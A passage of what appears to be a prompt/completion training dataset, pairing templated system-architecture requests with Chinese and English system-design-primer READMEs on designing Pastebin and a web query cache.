之间的权衡](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-还是-nosql)。下面的讨论是使用关系型数据库方法。\n\n* **客户端** 发送一个创建 paste 的请求到作为一个[反向代理](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#反向代理web-服务器)启动的 **Web 服务器**。\n* **Web 服务器** 转发请求给 **写接口** 服务器\n* **写接口** 服务器执行如下操作：\n  * 生成一个唯一的 url\n    * 检查这个 url 在 **SQL 数据库** 里面是否是唯一的\n    * 如果这个 url 不是唯一的，生成另外一个 url\n    * 如果我们支持自定义 url，我们可以使用用户提供的 url（也需要检查是否重复）\n  * 把生成的 url 存储到 **SQL 数据库** 的 `pastes` 表里面\n  * 存储 paste 的内容数据到 **对象存储** 里面\n  * 返回生成的 url\n\n**向面试官阐明你需要写多少代码**\n\n`pastes` 表可以有如下结构：\n\n```sql\nshortlink char(7) NOT NULL\nexpiration_length_in_minutes int NOT NULL\ncreated_at datetime NOT NULL\npaste_path varchar(255) NOT NULL\nPRIMARY KEY(shortlink)\n```\n\n我们将在 `shortlink` 字段和 `created_at` 字段上创建一个[数据库索引](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#使用正确的索引)，用来提高查询的速度（避免因为扫描全表导致的长时间查询）并将数据保存在内存中，从内存里面顺序读取 1MB 的数据需要大概 250 微秒，而从 SSD 上读取则需要花费 4 倍的时间，从硬盘上则需要花费 80 倍的时间。<sup><a href=https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#每个程序员都应该知道的延迟数 > 1</a></sup>\n\n为了生成唯一的 url，我们可以：\n\n* 使用 [**MD5**](https://en.wikipedia.org/wiki/MD5) 来哈希用户的 IP 地址 + 时间戳\n  * MD5 是一个普遍用来生成一个 128-bit 长度的哈希值的一种哈希方法\n  * MD5 是一致分布的\n  * 或者我们也可以用 MD5 哈希一个随机生成的数据\n* 用 [**Base 62**](https://www.kerstner.at/2012/07/shortening-strings-using-base-62-encoding/) 编码 MD5 哈希值\n  * 对于 urls，使用 Base 62 编码 `[a-zA-Z0-9]` 是比较合适的\n  * 对于每一个原始输入只会有一个 hash 结果，Base 62 是确定的（不涉及随机性）\n  * Base 64 是另外一个流行的编码方案，但是对于 urls，会因为额外的 `+` 和 `-` 字符串而产生一些问题\n  * 以下 [Base 62 伪代码](http://stackoverflow.com/questions/742013/how-to-code-a-url-shortener) 执行的时间复杂度是 O(k)，k 是数字的数量 = 7：\n\n```python\ndef base_encode(num, base=62):\n    digits = []\n    while num > 0\n      remainder = modulo(num, base)\n      digits.push(remainder)\n      num = divide(num, base)\n    digits = digits.reverse\n```\n\n* 取输出的前 7 个字符，结果会有 62^7 个可能的值，应该足以满足在 3 年内处理 3.6 亿个短链接的约束：\n\n```python\nurl = base_encode(md5(ip_address+timestamp))[:URL_LENGTH]\n```\n\n我们将会用一个公开的 [**REST 风格接口**](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#表述性状态转移rest)：\n\n```shell\n$ curl -X POST --data '{\"expiration_length_in_minutes\":\"60\", \\\"paste_contents\":\"Hello World!\"}' https://pastebin.com/api/v1/paste\n```\n\nResponse:\n\n```json\n{\n    \"shortlink\": \"foobar\"\n}\n```\n\n用于内部通信，我们可以用 [RPC](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#远程过程调用协议rpc)。\n\n### 用例：用户输入一个 paste 的 url 后可以看到它存储的内容\n\n* **客户端** 发送一个获取 paste 请求到 **Web Server**\n* **Web Server** 转发请求给 **读取接口** 服务器\n* **读取接口** 服务器执行如下操作：\n  * 在 **SQL 数据库** 检查这个生成的 url\n    * 如果这个 url 在 **SQL 数据库** 里面，则从 **对象存储** 获取这个 paste 的内容\n    * 否则，返回一个错误页面给用户\n\nREST API：\n\n```shell\ncurl https://pastebin.com/api/v1/paste?shortlink=foobar\n```\n\nResponse:\n\n```json\n{\n    \"paste_contents\": \"Hello World\",\n    \"created_at\": \"YYYY-MM-DD HH:MM:SS\",\n    \"expiration_length_in_minutes\": \"60\"\n}\n```\n\n### 用例： 服务跟踪分析页面\n\n因为实时分析不是必须的，所以我们可以简单的 **MapReduce** **Web Server** 的日志，用来生成点击次数。\n\n```python\nclass HitCounts(MRJob):\n\n    def extract_url(self, line):\n        \"\"\"Extract the generated url from the log line.\"\"\"\n        ...\n\n    def extract_year_month(self, line):\n        \"\"\"Return the year and month portions of the timestamp.\"\"\"\n        ...\n\n    def mapper(self, _, line):\n        \"\"\"Parse each log line, extract and transform relevant lines.\n\n        Emit key value pairs of the form:\n\n        (2016-01, url0), 1\n        (2016-01, url0), 1\n        (2016-01, url1), 1\n        \"\"\"\n        url = self.extract_url(line)\n        period = self.extract_year_month(line)\n        yield (period, url), 1\n\n    def reducer(self, key, values):\n        \"\"\"Sum values for each key.\n\n        (2016-01, url0), 2\n        (2016-01, url1), 1\n        \"\"\"\n        yield key, sum(values)\n```\n\n### 用例： 服务删除过期的 pastes\n\n为了删除过期的 pastes，我们可以直接搜索 **SQL 数据库** 中所有的过期时间比当前时间更早的记录，\n所有过期的记录将从这张表里面删除（或者将其标记为过期）。\n\n## 第四步：扩展这个设计\n\n> 给定约束条件，识别和解决瓶颈。\n\n![Imgur](http://i.imgur.com/4edXG0T.png)\n\n**重要提示: 不要简单的从最初的设计直接跳到最终的设计**\n\n说明您将迭代地执行这样的操作：1)**Benchmark/Load 测试**，2)**Profile** 出瓶颈，3)在评估替代方案和权衡时解决瓶颈，4)重复前面，可以参考[在 AWS 上设计一个可以支持百万用户的系统](../scaling_aws/README.md)这个用来解决如何迭代地扩展初始设计的例子。\n\n重要的是讨论在初始设计中可能遇到的瓶颈，以及如何解决每个瓶颈。比如，在多个 **Web 服务器** 上添加 **负载平衡器** 可以解决哪些问题？ **CDN** 解决哪些问题？**Master-Slave Replicas** 解决哪些问题? 替代方案是什么和怎么对每一个替代方案进行权衡比较？\n\n我们将介绍一些组件来完成设计，并解决可伸缩性问题。内部的负载平衡器并不能减少杂乱。\n\n**为了避免重复的讨论**， 参考以下[系统设计主题](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#系统设计主题的索引)获取主要讨论要点、权衡和替代方案：\n\n* [DNS](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#域名系统)\n* [CDN](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#内容分发网络cdn)\n* [负载均衡器](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#负载均衡器)\n* [水平扩展](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#水平扩展)\n* [反向代理（web 服务器）](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#反向代理web-服务器)\n* [应用层](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#应用层)\n* [缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存)\n* [关系型数据库管理系统 (RDBMS)](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#关系型数据库管理系统rdbms)\n* [SQL write master-slave failover](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#故障切换)\n* [主从复制](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#主从复制)\n* [一致性模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#一致性模式)\n* [可用性模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#可用性模式)\n\n**分析存储数据库** 可以用比如 Amazon Redshift 或者 Google BigQuery 这样的数据仓库解决方案。\n\n一个像 Amazon S3 这样的 **对象存储**，可以轻松处理每月 12.7 GB 的新内容约束。\n\n要处理 *平均* 每秒 40 读请求(峰值更高)，其中热点内容的流量应该由 **内存缓存** 处理，而不是数据库。**内存缓存** 对于处理分布不均匀的流量和流量峰值也很有用。只要副本没有陷入复制写的泥潭，**SQL Read Replicas** 应该能够处理缓存丢失。\n\n对于单个 **SQL Write Master-Slave**，*平均* 每秒 4paste 写入 (峰值更高) 应该是可以做到的。否则，我们需要使用额外的 SQL 扩展模式:\n\n* [联合](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#联合)\n* [分片](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#分片)\n* [非规范化](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#非规范化)\n* [SQL 调优](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#SQL调优)\n\n我们还应该考虑将一些数据移动到 **NoSQL 数据库**。\n\n## 额外的话题\n\n> 是否更深入探讨额外主题，取决于问题的范围和面试剩余的时间。\n\n### NoSQL\n\n* [键值存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#键-值存储)\n* [文档存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#文档类型存储)\n* [列型存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#列型存储)\n* [图数据库](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#图数据库)\n* [sql 还是 nosql](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-还是-nosql)\n\n### 缓存\n\n* 在哪缓存\n  * [客户端缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#客户端缓存)\n  * [CDN 缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#cdn-缓存)\n  * [Web 服务器缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#web-服务器缓存)\n  * [数据库缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#数据库缓存)\n  * [应用缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#应用缓存)\n* 缓存什么\n  * [数据库查询级别的缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#数据库查询级别的缓存)\n  * [对象级别的缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#对象级别的缓存)\n* 何时更新缓存\n  * [缓存模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存模式)\n  * [直写模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#直写模式)\n  * [回写模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#回写模式)\n  * [刷新](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#刷新)\n\n### 异步和微服务\n\n* [消息队列](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#消息队列)\n* [任务队列](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#任务队列)\n* [背压](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#背压)\n* [微服务](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#微服务)\n\n### 通信\n\n* 讨论权衡:\n  * 跟客户端之间的外部通信 - [HTTP APIs following REST](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#表述性状态转移rest)\n  * 内部通信 - [RPC](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#远程过程调用协议rpc)\n* [服务发现](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#服务发现)\n\n### 安全\n\n参考[安全](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#安全)。\n\n### 延迟数字\n\n见[每个程序员都应该知道的延迟数](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#每个程序员都应该知道的延迟数)。\n\n### 持续进行\n\n* 继续对系统进行基准测试和监控，以在瓶颈出现时解决它们\n* 扩展是一个迭代的过程\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/pastebin/README-zh-Hans.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 331}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Design Pastebin.com (or Bit.ly)\n\n*Note: This document links directly to relevant areas found in the [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) to avoid duplication.  Refer to the linked content for general talking points, tradeoffs, and alternatives.*\n\n**Design Bit.ly** - is a similar question, except pastebin requires storing the paste contents instead of the original unshortened url.\n\n## Step 1: Outline use cases and constraints\n\n> Gather requirements and scope the problem.\n> Ask questions to clarify use cases and constraints.\n> Discuss assumptions.\n\nWithout an interviewer to address clarifying questions, we'll define some use cases and constraints.\n\n### Use cases\n\n#### We'll scope the problem to handle only the following use cases\n\n* **User** enters a block of text and gets a randomly generated link\n    * Expiration\n        * Default setting does not expire\n        * Can optionally set a timed expiration\n* **User** enters a paste's url and views the contents\n* **User** is anonymous\n* **Service** tracks analytics of pages\n    * Monthly visit stats\n* **Service** deletes expired pastes\n* **Service** has high availability\n\n#### Out of scope\n\n* **User** registers for an account\n    * **User** verifies email\n* **User** logs into a registered account\n    * **User** edits the document\n* **User** can set visibility\n* **User** can set the shortlink\n\n### Constraints and assumptions\n\n#### State assumptions\n\n* Traffic is not evenly distributed\n* Following a short link should be fast\n* Pastes are text only\n* Page view analytics do not need to be realtime\n* 10 million users\n* 10 million paste writes per month\n* 100 million paste reads per month\n* 10:1 read to write ratio\n\n#### Calculate usage\n\n**Clarify with your interviewer if you should run back-of-the-envelope usage calculations.**\n\n* Size per paste\n    * 1 KB content per paste\n    * `shortlink` - 7 bytes\n    * `expiration_length_in_minutes` - 4 bytes\n    * `created_at` - 5 bytes\n    * `paste_path` - 255 bytes\n    * total = ~1.27 KB\n* 12.7 GB of new paste content per month\n    * 1.27 KB per paste * 10 million pastes per month\n    * ~450 GB of new paste content in 3 years\n    * 360 million shortlinks in 3 years\n    * Assume most are new pastes instead of updates to existing ones\n* 4 paste writes per second on average\n* 40 read requests per second on average\n\nHandy conversion guide:\n\n* 2.5 million seconds per month\n* 1 request per second = 2.5 million requests per month\n* 40 requests per second = 100 million requests per month\n* 400 requests per second = 1 billion requests per month\n\n## Step 2: Create a high level design\n\n> Outline a high level design with all important components.\n\n![Imgur](http://i.imgur.com/BKsBnmG.png)\n\n## Step 3: Design core components\n\n> Dive into details for each core component.\n\n### Use case: User enters a block of text and gets a randomly generated link\n\nWe could use a [relational database](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms) as a large hash table, mapping the generated url to a file server and path containing the paste file.\n\nInstead of managing a file server, we could use a managed **Object Store** such as Amazon S3 or a [NoSQL document store](https://github.com/donnemartin/system-design-primer#document-store).\n\nAn alternative to a relational database acting as a large hash table, we could use a [NoSQL key-value store](https://github.com/donnemartin/system-design-primer#key-value-store).  We should discuss the [tradeoffs between choosing SQL or NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql).  The following discussion uses the relational database approach.\n\n* The **Client** sends a create paste request to the **Web Server**, running as a [reverse proxy](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* The **Web Server** forwards the request to the **Write API** server\n* The **Write API** server does the following:\n    * Generates a unique url\n        * Checks if the url is unique by looking at the **SQL Database** for a duplicate\n        * If the url is not unique, it generates another url\n        * If we supported a custom url, we could use the user-supplied (also check for a duplicate)\n    * Saves to the **SQL Database** `pastes` table\n    * Saves the paste data to the **Object Store**\n    * Returns the url\n\n**Clarify with your interviewer how much code you are expected to write**.\n\nThe `pastes` table could have the following structure:\n\n```\nshortlink char(7) NOT NULL\nexpiration_length_in_minutes int NOT NULL\ncreated_at datetime NOT NULL\npaste_path varchar(255) NOT NULL\nPRIMARY KEY(shortlink)\n```\n\nSetting the primary key to be based on the `shortlink` column creates an [index](https://github.com/donnemartin/system-design-primer#use-good-indices) that the database uses to enforce uniqueness. We'll create an additional index on `created_at` to speed up lookups (log-time instead of scanning the entire table) and to keep the data in memory.  Reading 1 MB sequentially from memory takes about 250 microseconds, while reading from SSD takes 4x and from disk takes 80x longer.<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n\nTo generate the unique url, we could:\n\n* Take the [**MD5**](https://en.wikipedia.org/wiki/MD5) hash of the user's ip_address + timestamp\n    * MD5 is a widely used hashing function that produces a 128-bit hash value\n    * MD5 is uniformly distributed\n    * Alternatively, we could also take the MD5 hash of randomly-generated data\n* [**Base 62**](https://www.kerstner.at/2012/07/shortening-strings-using-base-62-encoding/) encode the MD5 hash\n    * Base 62 encodes to `[a-zA-Z0-9]` which works well for urls, eliminating the need for escaping special characters\n    * There is only one hash result for the original input and Base 62 is deterministic (no randomness involved)\n    * Base 64 is another popular encoding but provides issues for urls because of the additional `+` and `/` characters\n    * The following [Base 62 pseudocode](http://stackoverflow.com/questions/742013/how-to-code-a-url-shortener) runs in O(k) time where k is the number of digits = 7:\n\n```python\ndef base_encode(num, base=62):\n    digits = []\n    while num > 0\n      remainder = modulo(num, base)\n      digits.push(remainder)\n      num = divide(num, base)\n    digits = digits.reverse\n```\n\n* Take the first 7 characters of the output, which results in 62^7 possible values and should be sufficient to handle our constraint of 360 million shortlinks in 3 years:\n\n```python\nurl = base_encode(md5(ip_address+timestamp))[:URL_LENGTH]\n```\n\nWe'll use a public [**REST API**](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest):\n\n```\n$ curl -X POST --data '{ \"expiration_length_in_minutes\": \"60\", \\\n    \"paste_contents\": \"Hello World!\" }' https://pastebin.com/api/v1/paste\n```\n\nResponse:\n\n```\n{\n    \"shortlink\": \"foobar\"\n}\n```\n\nFor internal communications, we could use [Remote Procedure Calls](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc).\n\n### Use case: User enters a paste's url and views the contents\n\n* The **Client** sends a get paste request to the **Web Server**\n* The **Web Server** forwards the request to the **Read API** server\n* The **Read API** server does the following:\n    * Checks the **SQL Database** for the generated url\n        * If the url is in the **SQL Database**, fetch the paste contents from the **Object Store**\n        * Else, return an error message for the user\n\nREST API:\n\n```\n$ curl https://pastebin.com/api/v1/paste?shortlink=foobar\n```\n\nResponse:\n\n```\n{\n    \"paste_contents\": \"Hello World\"\n    \"created_at\": \"YYYY-MM-DD HH:MM:SS\"\n    \"expiration_length_in_minutes\": \"60\"\n}\n```\n\n### Use case: Service tracks analytics of pages\n\nSince realtime analytics are not a requirement, we could simply **MapReduce** the **Web Server** logs to generate hit counts.\n\n**Clarify with your interviewer how much code you are expected to write**.\n\n```python\nclass HitCounts(MRJob):\n\n    def extract_url(self, line):\n        \"\"\"Extract the generated url from the log line.\"\"\"\n        ...\n\n    def extract_year_month(self, line):\n        \"\"\"Return the year and month portions of the timestamp.\"\"\"\n        ...\n\n    def mapper(self, _, line):\n        \"\"\"Parse each log line, extract and transform relevant lines.\n\n        Emit key value pairs of the form:\n\n        (2016-01, url0), 1\n        (2016-01, url0), 1\n        (2016-01, url1), 1\n        \"\"\"\n        url = self.extract_url(line)\n        period = self.extract_year_month(line)\n        yield (period, url), 1\n\n    def reducer(self, key, values):\n        \"\"\"Sum values for each key.\n\n        (2016-01, url0), 2\n        (2016-01, url1), 1\n        \"\"\"\n        yield key, sum(values)\n```\n\n### Use case: Service deletes expired pastes\n\nTo delete expired pastes, we could just scan the **SQL Database** for all entries whose expiration timestamp are older than the current timestamp.  All expired entries would then be deleted (or  marked as expired) from the table.\n\n## Step 4: Scale the design\n\n> Identify and address bottlenecks, given the constraints.\n\n![Imgur](http://i.imgur.com/4edXG0T.png)\n\n**Important: Do not simply jump right into the final design from the initial design!**\n\nState you would do this iteratively: 1) **Benchmark/Load Test**, 2) **Profile** for bottlenecks 3) address bottlenecks while evaluating alternatives and trade-offs, and 4) repeat.  See [Design a system that scales to millions of users on AWS](../scaling_aws/README.md) as a sample on how to iteratively scale the initial design.\n\nIt's important to discuss what bottlenecks you might encounter with the initial design and how you might address each of them.  For example, what issues are addressed by adding a **Load Balancer** with multiple **Web Servers**?  **CDN**?  **Master-Slave Replicas**?  What are the alternatives and **Trade-Offs** for each?\n\nWe'll introduce some components to complete the design and to address scalability issues.  Internal load balancers are not shown to reduce clutter.\n\n*To avoid repeating discussions*, refer to the following [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) for main talking points, tradeoffs, and alternatives:\n\n* [DNS](https://github.com/donnemartin/system-design-primer#domain-name-system)\n* [CDN](https://github.com/donnemartin/system-design-primer#content-delivery-network)\n* [Load balancer](https://github.com/donnemartin/system-design-primer#load-balancer)\n* [Horizontal scaling](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n* [Web server (reverse proxy)](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* [API server (application layer)](https://github.com/donnemartin/system-design-primer#application-layer)\n* [Cache](https://github.com/donnemartin/system-design-primer#cache)\n* [Relational database management system (RDBMS)](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)\n* [SQL write master-slave failover](https://github.com/donnemartin/system-design-primer#fail-over)\n* [Master-slave replication](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [Consistency patterns](https://github.com/donnemartin/system-design-primer#consistency-patterns)\n* [Availability patterns](https://github.com/donnemartin/system-design-primer#availability-patterns)\n\nThe **Analytics Database** could use a data warehousing solution such as Amazon Redshift or Google BigQuery.\n\nAn **Object Store** such as Amazon S3 can comfortably handle the constraint of 12.7 GB of new content per month.\n\nTo address the 40 *average* read requests per second (higher at peak), traffic for popular content should be handled by the **Memory Cache** instead of the database.  The **Memory Cache** is also useful for handling the unevenly distributed traffic and traffic spikes.  The **SQL Read Replicas** should be able to handle the cache misses, as long as the replicas are not bogged down with replicating writes.\n\n4 *average* paste writes per second (with higher at peak) should be do-able for a single **SQL Write Master-Slave**.  Otherwise, we'll need to employ additional SQL scaling patterns:\n\n* [Federation](https://github.com/donnemartin/system-design-primer#federation)\n* [Sharding](https://github.com/donnemartin/system-design-primer#sharding)\n* [Denormalization](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL Tuning](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\nWe should also consider moving some data to a **NoSQL Database**.\n\n## Additional talking points\n\n> Additional topics to dive into, depending on the problem scope and time remaining.\n\n#### NoSQL\n\n* [Key-value store](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [Document store](https://github.com/donnemartin/system-design-primer#document-store)\n* [Wide column store](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [Graph database](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### Caching\n\n* Where to cache\n    * [Client caching](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN caching](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web server caching](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [Database caching](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [Application caching](https://github.com/donnemartin/system-design-primer#application-caching)\n* What to cache\n    * [Caching at the database query level](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [Caching at the object level](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* When to update the cache\n    * [Cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [Write-through](https://github.com/donnemartin/system-design-primer#write-through)\n    * [Write-behind (write-back)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [Refresh ahead](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### Asynchronism and microservices\n\n* [Message queues](https://github.com/donnemartin/system-design-primer#message-queues)\n* [Task queues](https://github.com/donnemartin/system-design-primer#task-queues)\n* [Back pressure](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [Microservices](https://github.com/donnemartin/system-design-primer#microservices)\n\n### Communications\n\n* Discuss tradeoffs:\n    * External communication with clients - [HTTP APIs following REST](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * Internal communications - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [Service discovery](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### Security\n\nRefer to the [security section](https://github.com/donnemartin/system-design-primer#security).\n\n### Latency numbers\n\nSee [Latency numbers every programmer should know](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know).\n\n### Ongoing\n\n* Continue benchmarking and monitoring your system to address bottlenecks as they come up\n* Scaling is an iterative process\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/pastebin/README.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.92, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 333}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# 设计一个键-值缓存来存储最近 web 服务查询的结果\n\n**注意：这个文档中的链接会直接指向[系统设计主题索引](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#系统设计主题的索引)中的有关部分，以避免重复的内容。你可以参考链接的相关内容，来了解其总的要点、方案的权衡取舍以及可选的替代方案。**\n\n## 第一步：简述用例与约束条件\n\n> 搜集需求与问题的范围。\n> 提出问题来明确用例与约束条件。\n> 讨论假设。\n\n我们将在没有面试官明确说明问题的情况下，自己定义一些用例以及限制条件。\n\n### 用例\n\n#### 我们将把问题限定在仅处理以下用例的范围中\n\n* **用户**发送一个搜索请求，命中缓存\n* **用户**发送一个搜索请求，未命中缓存\n* **服务**有着高可用性\n\n### 限制条件与假设\n\n#### 提出假设\n\n* 网络流量不是均匀分布的\n    * 经常被查询的内容应该一直存于缓存中\n    * 需要确定如何规定缓存过期、缓存刷新规则\n* 缓存提供的服务查询速度要快\n* 机器间延迟较低\n* 缓存有内存限制\n    * 需要决定缓存什么、移除什么\n    *  需要缓存百万级的查询\n* 1000 万用户\n* 每个月 100 亿次查询\n\n#### 计算用量\n\n**如果你需要进行粗略的用量计算，请向你的面试官说明。**\n\n* 缓存存储的是键值对有序表，键为 `query`（查询），值为 `results`（结果）。\n    * `query` - 50 字节\n    * `title` - 20 字节\n    * `snippet` - 200 字节\n    * 总计：270 字节\n* 假如 100 亿次查询都是不同的，且全部需要存储，那么每个月需要 2.7 TB 的缓存空间\n    * 单次查询 270 字节 * 每月查询 100 亿次\n    * 假设内存大小有限制，需要决定如何制定缓存过期规则\n* 每秒 4,000 次请求\n\n便利换算指南：\n\n* 每个月有 250 万秒\n* 每秒一个请求 = 每个月 250 万次请求\n* 每秒 40 个请求 = 每个月 1 亿次请求\n* 每秒 400 个请求 = 每个月 10 亿次请求\n\n## 第二步：概要设计\n\n> 列出所有重要组件以规划概要设计。\n\n![Imgur](http://i.imgur.com/KqZ3dSx.png)\n\n## 第三步：设计核心组件\n\n> 深入每个核心组件的细节。\n\n### 用例：用户发送了一次请求，命中了缓存\n\n常用的查询可以由例如 Redis 或者 Memcached 之类的**内存缓存**提供支持，以减少数据读取延迟，并且避免**反向索引服务**以及**文档服务**的过载。从内存读取 1 MB 连续数据大约要花 250 微秒，而从 SSD 读取同样大小的数据要花费 4 倍的时间，从机械硬盘读取需要花费 80 倍以上的时间。<sup><a href=https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#每个程序员都应该知道的延迟数>1</a></sup>\n\n由于缓存容量有限，我们将使用 LRU（近期最少使用算法）来控制缓存的过期。\n\n* **客户端**向运行[反向代理](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#反向代理web-服务器)的 **Web 服务器**发送一个请求\n* 这个 **Web 服务器**将请求转发给**查询 API** 服务\n* **查询 API** 服务将会做这些事情：\n    * 分析查询\n        * 移除多余的内容\n        * 将文本分割成词组\n        * 修正拼写错误\n        * 规范化字母的大小写\n        * 将查询转换为布尔运算\n    * 检测**内存缓存**是否有匹配查询的内容\n        * 如果命中**内存缓存**，**内存缓存**将会做以下事情：\n            * 将缓存入口的位置指向 LRU 链表的头部\n            * 返回缓存内容\n        * 否则，**查询 API** 将会做以下事情：\n            * 使用**反向索引服务**来查找匹配查询的文档\n                * **反向索引服务**对匹配到的结果进行排名，然后返回最符合的结果\n            * 使用**文档服务**返回文章标题与片段\n            * 更新**内存缓存**，存入内容，将**内存缓存**入口位置指向 LRU 链表的头部\n\n#### 缓存的实现\n\n缓存可以使用双向链表实现：新元素将会在头结点加入，过期的元素将会在尾节点被删除。我们使用哈希表以便能够快速查找每个链表节点。\n\n**向你的面试官告知你准备写多少代码**。\n\n实现**查询 API 服务**：\n\n```python\nclass QueryApi(object):\n\n    def __init__(self, memory_cache, reverse_index_service):\n        self.memory_cache = memory_cache\n        self.reverse_index_service = reverse_index_service\n\n    def parse_query(self, query):\n        \"\"\"移除多余内容，将文本分割成词组，修复拼写错误，\n        规范化字母大小写，转换布尔运算。\n        \"\"\"\n        ...\n\n    def process_query(self, query):\n        query = self.parse_query(query)\n        results = self.memory_cache.get(query)\n        if results is None:\n            results = 